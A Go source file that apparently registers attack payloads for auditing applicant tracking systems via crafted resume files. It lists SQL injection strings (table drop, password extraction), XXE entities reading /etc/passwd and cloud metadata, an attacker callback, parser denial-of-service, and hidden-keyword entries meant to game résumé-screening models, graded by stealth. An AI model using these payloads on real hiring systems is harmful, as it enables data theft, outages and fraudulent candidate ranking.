// Package payloads defines the registry of attack payloads used for ATS
// (Applicant Tracking System) security auditing. It has no dependencies on
// other internal packages.
package payloads

// StealthLevel represents how "loud" or detectable a payload delivery
// technique is, from raw/obvious (1) to fully polyglot/blended (5).
type StealthLevel int

const (
	LevelBasic    StealthLevel = 1 // Raw payloads
	LevelEncoded  StealthLevel = 2 // Hex-escaped
	LevelSplit    StealthLevel = 3 // Fragmented
	LevelShadowed StealthLevel = 4 // Incremental update
	LevelPolyglot StealthLevel = 5 // Multi-format
)

// Category groups related payloads together (e.g. SQL injection, XXE).
type Category struct {
	ID          string    `json:"id"`
	Name        string    `json:"name"`
	Description string    `json:"description"`
	Color       string    `json:"color"`
	Payloads    []Payload `json:"payloads"`
}

// Payload describes a single attack payload variant within a category.
type Payload struct {
	ID          string   `json:"id"`
	Name        string   `json:"name"`
	Description string   `json:"description"`
	Impact      string   `json:"impact"`    // low/medium/high/critical
	Stealth     []int    `json:"stealth"`   // Compatible levels
	Locations   []string `json:"locations"` // metadata/xmp/orphan/xref/content
	Template    string   `json:"-"`         // Payload template (not exposed in JSON)
}

// allStealthLevels is the full compatible range 1-5, used by payloads that
// don't restrict which stealth delivery levels they can be paired with.
var allStealthLevels = []int{1, 2, 3, 4, 5}

// Registry is the ordered list of all payload categories.
var Registry = []Category{
	{
		ID:          "sqli",
		Name:        "SQL Injection",
		Description: "Payloads targeting SQL injection vulnerabilities in ATS backends.",
		Color:       "warn",
		Payloads: []Payload{
			{
				ID:          "basic",
				Name:        "Basic Drop Table",
				Description: "Classic SQL injection attempting to drop a table.",
				Impact:      "critical",
				Stealth:     allStealthLevels,
				Locations:   []string{"metadata", "content"},
				Template:    `'; DROP TABLE {{table}}; --`,
			},
			{
				ID:          "blind",
				Name:        "Blind Time-Based",
				Description: "Blind SQL injection using a time delay to infer execution.",
				Impact:      "high",
				Stealth:     allStealthLevels,
				Locations:   []string{"metadata", "content"},
				Template:    `'; WAITFOR DELAY '0:0:5'; --`,
			},
			{
				ID:          "union",
				Name:        "Union-Based Extraction",
				Description: "Union-based SQL injection to extract password data.",
				Impact:      "critical",
				Stealth:     allStealthLevels,
				Locations:   []string{"metadata", "content"},
				Template:    `' UNION SELECT password FROM users --`,
			},
		},
	},
	{
		ID:          "xxe",
		Name:        "XXE",
		Description: "XML External Entity payloads targeting XML parsers used during resume ingestion.",
		Color:       "danger",
		Payloads: []Payload{
			{
				ID:          "file_read",
				Name:        "Local File Read",
				Description: "XXE entity attempting to read a local file from the server.",
				Impact:      "critical",
				Stealth:     allStealthLevels,
				Locations:   []string{"xmp", "content"},
				Template:    `<!ENTITY xxe SYSTEM "file:///etc/passwd">`,
			},
			{
				ID:          "ssrf",
				Name:        "Cloud Metadata SSRF",
				Description: "XXE entity attempting to reach the cloud metadata service.",
				Impact:      "critical",
				Stealth:     allStealthLevels,
				Locations:   []string{"xmp", "content"},
				Template:    `<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">`,
			},
			{
				ID:          "callback",
				Name:        "Out-of-Band Callback",
				Description: "XXE entity that calls back to an attacker-controlled URL.",
				Impact:      "high",
				Stealth:     allStealthLevels,
				Locations:   []string{"xmp", "content"},
				Template:    `<!ENTITY xxe SYSTEM "{{callback_url}}">`,
			},
			{
				ID:          "billion_laughs",
				Name:        "Billion Laughs",
				Description: "Exponential entity expansion payload, generated dynamically.",
				Impact:      "high",
				Stealth:     allStealthLevels,
				Locations:   []string{"xmp", "content"},
				Template:    "", // generated dynamically
			},
		},
	},
	{
		ID:          "dos",
		Name:        "Denial of Service",
		Description: "Payloads designed to exhaust parser resources (CPU, memory).",
		Color:       "danger",
		Payloads: []Payload{
			{
				ID:          "entity_expansion",
				Name:        "Entity Expansion",
				Description: "Billion laughs style exponential entity expansion.",
				Impact:      "high",
				Stealth:     allStealthLevels,
				Locations:   []string{"xmp", "content"},
				Template:    "", // generated dynamically
			},
			{
				ID:          "recursion",
				Name:        "Circular Xref",
				Description: "Circular cross-reference table designed to induce infinite recursion in a PDF parser.",
				Impact:      "medium",
				Stealth:     allStealthLevels,
				Locations:   []string{"xref"},
				Template:    "", // generated dynamically
			},
			{
				ID:          "bloat",
				Name:        "Orphaned Object Bloat",
				Description: "Massive orphaned objects designed to bloat parser memory usage.",
				Impact:      "medium",
				Stealth:     allStealthLevels,
				Locations:   []string{"orphan"},
				Template:    "", // generated dynamically
			},
		},
	},
	{
		ID:          "integrity",
		Name:        "Data Integrity",
		Description: "Payloads that corrupt or manipulate extracted data integrity.",
		Color:       "info",
		Payloads: []Payload{
			{
				ID:          "unicode",
				Name:        "Unicode Tricks",
				Description: "Homoglyphs, RTL override, and zero-width characters to mislead text extraction.",
				Impact:      "low",
				Stealth:     allStealthLevels,
				Locations:   []string{"metadata", "content"},
				Template:    "", // generated dynamically
			},
			{
				ID:          "truncation",
				Name:        "Field Truncation",
				Description: "Strings crafted to sit exactly at field length limits.",
				Impact:      "low",
				Stealth:     allStealthLevels,
				Locations:   []string{"metadata", "content"},
				Template:    "", // generated dynamically
			},
			{
				ID:          "encoding",
				Name:        "Mixed Encoding",
				Description: "Mixed character encodings intended to confuse extraction pipelines.",
				Impact:      "medium",
				Stealth:     allStealthLevels,
				Locations:   []string{"metadata", "content"},
				Template:    "", // generated dynamically
			},
		},
	},
	{
		ID:          "ml_poison",
		Name:        "ML Poisoning",
		Description: "Payloads targeting ML-based resume screening and ranking models.",
		Color:       "accent",
		Payloads: []Payload{
			{
				ID:          "skills",
				Name:        "Hidden Skills",
				Description: "Hidden skill keywords intended to manipulate ML screening scores.",
				Impact:      "medium",
				Stealth:     allStealthLevels,
				Locations:   []string{"metadata", "content"},
				Template:    "", // generated dynamically
			},
			{
				ID:          "titles",
				Name:        "Hidden Job Titles",
				Description: "Hidden job titles intended to manipulate ML screening scores.",
				Impact:      "medium",
				Stealth:     allStealthLevels,
				Locations:   []string{"metadata", "content"},
				Template:    "", // generated dynamically
			},
			{
				ID:          "keywords",
				Name:        "Keyword Stuffing",
				Description: "Excessive keyword stuffing intended to manipulate ML ranking models.",
				Impact:      "low",
				Stealth:     allStealthLevels,
				Locations:   []string{"metadata", "content"},
				Template:    "", // generated dynamically
			},
		},
	},
}

// GetCategory returns a category by ID, or nil if not found.
func GetCategory(id string) *Category {
	for i := range Registry {
		if Registry[i].ID == id {
			return &Registry[i]
		}
	}
	return nil
}

// GetPayload returns a payload by "category.payload" ID (e.g., "sqli.basic"),
// or nil if not found or the ID is malformed.
func GetPayload(id string) *Payload {
	catID, payloadID, ok := splitPayloadID(id)
	if !ok {
		return nil
	}
	cat := GetCategory(catID)
	if cat == nil {
		return nil
	}
	for i := range cat.Payloads {
		if cat.Payloads[i].ID == payloadID {
			return &cat.Payloads[i]
		}
	}
	return nil
}

// splitPayloadID splits a "category.payload" ID into its two parts.
func splitPayloadID(id string) (category string, payload string, ok bool) {
	for i := 0; i < len(id); i++ {
		if id[i] == '.' {
			return id[:i], id[i+1:], true
		}
	}
	return "", "", false
}

// profiles maps preset profile IDs to the payload IDs they contain.
// It is built lazily from the Registry contents so it stays in sync.
var profiles = buildProfiles()

func buildProfiles() map[string][]string {
	p := map[string][]string{
		"sqli_focus": allPayloadIDsInCategory("sqli"),
		"xxe_focus":  allPayloadIDsInCategory("xxe"),
		"dos_focus":  allPayloadIDsInCategory("dos"),
		"full_audit": allPayloadIDs(),
		"stealth_recon": payloadIDsWithStealth(
			int(LevelShadowed), int(LevelPolyglot),
		),
	}
	return p
}

func allPayloadIDsInCategory(catID string) []string {
	cat := GetCategory(catID)
	if cat == nil {
		return nil
	}
	ids := make([]string, 0, len(cat.Payloads))
	for _, p := range cat.Payloads {
		ids = append(ids, catID+"."+p.ID)
	}
	return ids
}

func allPayloadIDs() []string {
	var ids []string
	for _, cat := range Registry {
		for _, p := range cat.Payloads {
			ids = append(ids, cat.ID+"."+p.ID)
		}
	}
	return ids
}

// payloadIDsWithStealth returns IDs of every payload compatible with any of
// the given stealth levels.
func payloadIDsWithStealth(levels ...int) []string {
	want := make(map[int]bool, len(levels))
	for _, l := range levels {
		want[l] = true
	}
	var ids []string
	for _, cat := range Registry {
		for _, p := range cat.Payloads {
			for _, s := range p.Stealth {
				if want[s] {
					ids = append(ids, cat.ID+"."+p.ID)
					break
				}
			}
		}
	}
	return ids
}

// ProfileIDs returns available preset profile IDs.
func ProfileIDs() []string {
	ids := make([]string, 0, len(profiles))
	for id := range profiles {
		ids = append(ids, id)
	}
	return ids
}

// GetProfile returns the payload IDs for a preset profile, or nil if the
// profile ID is unknown.
func GetProfile(id string) []string {
	return profiles[id]
}
